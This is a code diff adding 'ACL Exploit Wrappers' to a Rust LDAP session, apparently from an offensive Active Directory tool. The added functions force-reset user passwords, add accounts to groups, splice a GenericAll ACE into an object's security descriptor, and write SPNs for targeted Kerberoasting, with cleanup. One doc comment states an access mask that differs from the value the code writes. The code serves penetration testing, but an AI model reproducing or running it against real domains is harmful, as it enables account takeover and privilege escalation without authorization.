@@ -2225,6 +2225,162 @@ impl LdapSession {
     }
 
     // ═══════════════════════════════════════════════════════
+    //  ACL Exploit Wrappers (GenericAll / WriteDACL / ForceChangePassword)
+    // ═══════════════════════════════════════════════════════
+
+    /// Force-change a user's password using the `User-Force-Change-Password`
+    /// extended right (does not require knowing the current password).
+    ///
+    /// Requires `ExtendedRight(User-Force-Change-Password)` or `GenericAll` on
+    /// the target user object.  Uses the LDAP password modify extended operation
+    /// through a `unicodePwd` REPLACE (requires LDAPS or signing).
+    pub async fn force_change_password(&mut self, user_dn: &str, new_password: &str) -> Result<()> {
+        info!("ACL: Force-changing password for '{}'", user_dn);
+
+        // Encode new password as UTF-16LE, wrapped in double-quotes, as AD requires
+        let quoted = format!("\"{}\"", new_password);
+        let pwd_utf16: Vec<u8> = quoted
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+
+        self.modify_replace(user_dn, "unicodePwd", &pwd_utf16).await?;
+        info!("ACL: Password changed for '{}'", user_dn);
+        Ok(())
+    }
+
+    /// Add `member_dn` to a group identified by `group_dn`.
+    ///
+    /// Requires `WriteProperty(member)` or `GenericAll` on the group object.
+    pub async fn add_member_to_group(&mut self, group_dn: &str, member_dn: &str) -> Result<()> {
+        info!(
+            "ACL: Adding '{}' to group '{}'",
+            member_dn, group_dn
+        );
+        self.modify_add(group_dn, "member", &[member_dn.to_string()])
+            .await?;
+        info!("ACL: Group membership write succeeded");
+        Ok(())
+    }
+
+    /// Remove `member_dn` from a group identified by `group_dn`.
+    ///
+    /// Requires `WriteProperty(member)` or `GenericAll` on the group object.
+    pub async fn remove_member_from_group(
+        &mut self,
+        group_dn: &str,
+        member_dn: &str,
+    ) -> Result<()> {
+        info!(
+            "ACL: Removing '{}' from group '{}'",
+            member_dn, group_dn
+        );
+        self.modify_delete_values(group_dn, "member", &[member_dn.to_string()])
+            .await?;
+        info!("ACL: Group membership removal succeeded");
+        Ok(())
+    }
+
+    /// Append a new allow-ACE granting `GenericAll` to `trustee_sid` on
+    /// the object at `target_dn`.
+    ///
+    /// Reads the current `nTSecurityDescriptor`, builds a new allow-ACE
+    /// (ACCESS_ALLOWED_ACE: ACCESS_MASK=0x000F01FF = GENERIC_ALL), appends
+    /// it to the existing DACL, and writes the descriptor back.
+    ///
+    /// Requires `WriteDACL` on the target object.
+    pub async fn write_dacl_grant_generic_all(
+        &mut self,
+        target_dn: &str,
+        trustee_sid_bytes: &[u8],
+    ) -> Result<()> {
+        info!(
+            "ACL: Writing GenericAll ACE for trustee on '{}'",
+            target_dn
+        );
+
+        let mut ntsd = self.read_ntsd(target_dn).await?;
+
+        // Safety: validate basic SD header (revision=1, sbz1=0, control, offsets)
+        if ntsd.len() < 20 {
+            return Err(OverthroneError::Ldap {
+                target: target_dn.to_string(),
+                reason: "Security descriptor too short to modify".to_string(),
+            });
+        }
+
+        // Build a minimal ACCESS_ALLOWED_ACE:
+        // AceType=0x00, AceFlags=0x00, AceSize=u16, Mask=GENERIC_ALL(0x10000000), Sid=trustee
+        let ace_size = (4u16 + 4 + trustee_sid_bytes.len() as u16) as u16;
+        let mut new_ace = Vec::with_capacity(ace_size as usize);
+        new_ace.push(0x00); // AceType: ACCESS_ALLOWED_ACE_TYPE
+        new_ace.push(0x00); // AceFlags
+        new_ace.extend_from_slice(&ace_size.to_le_bytes()); // AceSize
+        new_ace.extend_from_slice(&0x10000000u32.to_le_bytes()); // GENERIC_ALL
+        new_ace.extend_from_slice(trustee_sid_bytes);
+
+        // Locate the DACL in the security descriptor.
+        // SECURITY_DESCRIPTOR layout (absolute, offset 4 = Control, offset 16 = DaclOffset)
+        let dacl_offset = u32::from_le_bytes(ntsd[16..20].try_into().unwrap()) as usize;
+        if dacl_offset == 0 || dacl_offset + 8 > ntsd.len() {
+            return Err(OverthroneError::Ldap {
+                target: target_dn.to_string(),
+                reason: "DACL offset invalid in security descriptor".to_string(),
+            });
+        }
+
+        // ACL layout: Revision(1)+Sbz1(1)+AclSize(2)+AceCount(2)+Sbz2(2)
+        // Update AclSize and AceCount
+        let old_acl_size =
+            u16::from_le_bytes([ntsd[dacl_offset + 2], ntsd[dacl_offset + 3]]) as usize;
+        let ace_count =
+            u16::from_le_bytes([ntsd[dacl_offset + 4], ntsd[dacl_offset + 5]]) as u16;
+
+        let new_acl_size = (old_acl_size + new_ace.len()) as u16;
+        let new_ace_count = ace_count + 1;
+
+        // Insert the new ACE at the end of the DACL
+        let insert_pos = dacl_offset + old_acl_size;
+        ntsd.splice(insert_pos..insert_pos, new_ace.iter().cloned());
+
+        // Update AclSize and AceCount in the DACL header
+        ntsd[dacl_offset + 2..dacl_offset + 4]
+            .copy_from_slice(&new_acl_size.to_le_bytes());
+        ntsd[dacl_offset + 4..dacl_offset + 6]
+            .copy_from_slice(&new_ace_count.to_le_bytes());
+
+        // Write the modified security descriptor back
+        self.modify_replace(target_dn, "nTSecurityDescriptor", &ntsd)
+            .await?;
+
+        info!(
+            "ACL: GenericAll ACE written to '{}' (DACL now {} ACEs)",
+            target_dn, new_ace_count
+        );
+        Ok(())
+    }
+
+    /// Set the `servicePrincipalName` attribute on `target_dn` to `spn`.
+    ///
+    /// With `WriteProperty(servicePrincipalName)` or `GenericAll`, this
+    /// enables targeted Kerberoasting of any user account.
+    pub async fn write_spn(&mut self, target_dn: &str, spn: &str) -> Result<()> {
+        info!("ACL: Writing SPN '{}' on '{}'", spn, target_dn);
+        self.modify_add(target_dn, "servicePrincipalName", &[spn.to_string()])
+            .await?;
+        info!("ACL: SPN write succeeded");
+        Ok(())
+    }
+
+    /// Remove an SPN from `target_dn` (cleanup after targeted Kerberoasting).
+    pub async fn remove_spn(&mut self, target_dn: &str, spn: &str) -> Result<()> {
+        info!("ACL: Removing SPN '{}' from '{}'", spn, target_dn);
+        self.modify_delete_values(target_dn, "servicePrincipalName", &[spn.to_string()])
+            .await?;
+        Ok(())
+    }
+
+    // ═══════════════════════════════════════════════════════
     //  Custom Queries
     // ═══════════════════════════════════════════════════════
 
